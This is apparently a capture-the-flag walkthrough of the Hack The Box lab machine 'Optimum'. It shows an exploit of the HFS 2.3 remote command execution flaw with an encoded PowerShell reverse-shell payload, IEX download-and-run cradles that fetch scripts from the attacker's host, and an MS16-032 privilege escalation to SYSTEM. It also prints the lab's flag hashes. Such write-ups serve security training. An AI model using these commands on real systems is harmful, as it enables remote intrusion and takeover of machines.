# optimum: https://app.hackthebox.com/machines/Optimum

```bash
nmap -sC -sV 10.10.10.8                  

Nmap scan report for 10.10.10.8
Host is up (0.12s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
searchsploit HFS                        

HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                 | windows/remote/49584.py

```

```bash
searchsploit -m windows/remote/49584.py
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
Copied to: /home/joker/Desktop/23_HTB/optimum/49584.py

```

```bash
python 49584.py                           

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.34
lport:  7777
rhost:  10.10.10.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA0ACIALAA3ADcANwA3ACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAgAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

Listening for connection...
listening on [any] 7777 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.8] 49166
id
PS C:\Users\kostas\Desktop> 

```

```bash 
PS C:\Users\kostas\Desktop> type user.txt
bfc3277f35c433201533d891b2bff5c6
```

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

Saving to: ‘Sherlock.ps1’
```

```bash
PS C:\Users\kostas\Downloads> powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34:8989/Sherlock.ps1','C:\\Users\kostas\\Downloads\\sherlock.ps1')";

PS C:\Users\kostas\Downloads> dir

    Directory: C:\Users\kostas\Downloads

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         18/3/2017   2:10 ??     727450 hfs2.3_288.zip                    
-a---         15/4/2023   2:14 ??      16663 sherlock.ps1                      
```

```bash

PS C:\Users\kostas\Downloads> powershell.exe -exec bypass -Command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"

.
.Truncated...
.
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
.
.Truncated...
.
```

```bash

 wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1                                                                                     
Saving to: ‘Invoke-MS16032.ps1’
```
```bash
python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

mv Invoke-PowerShellTcp.ps1 rev.ps1
```

***The last line is added***
```bash
tail -1 rev.ps1           
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 7070
```

```bash
nc -lvnp 7070
listening on [any] 7070 ...
```

***The last line is added***
```bash
tail -1 Invoke-MS16032.ps1

Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34/rev.ps1')" 
```

***It did not work***
```bash
PS C:\Users\kostas\Downloads> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34/Invoke-MS16032.ps1')
```

```bash 
PS C:\Users\kostas\Desktop> [environment]::is64bitprocess   
False
```

***Change the line 32 in 49584.py as below*** <br>
***Added: C:\Windows\sysnative\WindowsPowerShell\v1.0\*** 
```bash
payload = f'exec|C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
```

```bash
python 49584.py

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.34
lport:  9999
rhost:  10.10.10.8
rport:  80
payload:  exec|C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA0ACIALAA5ADkAOQA5ACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAgAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

Listening for connection...
listening on [any] 9999 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.8] 49170

PS C:\Users\kostas\Desktop>    
```

```bash
PS C:\Users\kostas\Desktop> [environment]::is64bitprocess
True
```

```bash
PS C:\Users\kostas\Downloads> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34/Invoke-MS16032.ps1')
```

```bash
nc -lvnp 7070
listening on [any] 7070 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.8] 49200
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Downloads>whoami
nt authority\system

PS C:\Users\kostas\Downloads> cd ..\..\Administrator
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> type root.txt
19f2730610a1fac8f24690b79c66a995
```
